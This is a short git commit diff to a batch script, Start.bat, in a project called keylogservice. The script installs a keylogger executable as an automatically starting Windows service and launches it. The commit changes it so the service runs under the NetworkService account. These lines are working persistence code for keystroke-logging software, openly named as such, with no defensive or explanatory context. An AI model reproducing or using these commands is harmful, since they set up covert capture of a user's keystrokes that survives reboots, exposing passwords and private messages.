2e06dc4675c57d3d927a59a02756fac2c0ea0900
Lakenoen <110137483+Lakenoen@users.noreply.github.com>
2024-10-13 04:37:35 +0500

    Update Start.bat

--- keylogservice/Start.bat
+++ keylogservice/Start.bat
@@ -1,2 +1,2 @@
-sc.exe create KeyLogService binpath= "%cd%/keylogservice.exe" start= auto
+sc.exe create KeyLogService binpath= "%cd%/keylogservice.exe" start= auto obj= "NT AUTHORITY\NetworkService"
 sc.exe start KeyLogService
